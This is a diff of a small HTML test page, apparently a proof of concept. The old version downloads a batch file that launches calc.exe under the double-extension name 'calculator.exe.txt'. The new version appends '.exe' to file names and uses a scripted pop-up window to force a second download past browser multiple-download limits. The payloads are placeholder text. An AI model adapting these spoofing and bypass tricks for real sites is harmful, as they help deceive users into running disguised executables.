@@ -2,23 +2,35 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Tech 2 – Double‑extension</title>
-<style>/* same styles as above */</style>
+<title>Tech 2 – Double ext</title>
+<style>/* same */</style>
 </head>
 <body>
-<h2>Tech 2 – Double‑extension</h2>
-<button onclick="run()">Download as calculator.exe.txt</button>
-<pre id="out" style="margin-top:10px;"></pre>
+<h2>Bypass Multiple Download</h2>
+<button onclick="run()">Execute Injection</button>
+<pre id="out" style="margin:10px auto;width:100%;text-align:left;"></pre>
 <script>
-function run(){
-  const txt = '@echo off\nstart calc.exe';
+function download(name, content){
+  // menambahkan ekstensi .exe secara harfiah ke nama file
   const a = document.createElement('a');
-  a.href = URL.createObjectURL(new Blob([txt], {type:'text/plain'}));
-  a.download = 'calculator.exe.txt';   // double extension
+  a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
+  a.download = name + '.exe'; // jadi main_context.txt.exe
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
-  document.getElementById('out').innerText = 'Downloaded as calculator.exe.txt (double‑ext)';
+}
+function run(){
+  download('main_context', 'Main content'); // tanpa .txt, jadi main_context.txt.exe
+  setTimeout(()=>{
+    const win = window.open('', '_blank');
+    if(win){
+      win.document.write(`<script>setTimeout(()=>{const a=document.createElement('a');
+        a.href=URL.createObjectURL(new Blob(['Injected content'],{type:'text/plain'}));
+        a.download='injected_context.txt.exe';
+        document.body.appendChild(a);a.click();},300);<\/script>`);
+      win.document.close();
+    }
+  },500);
 }
 </script>
 </body>
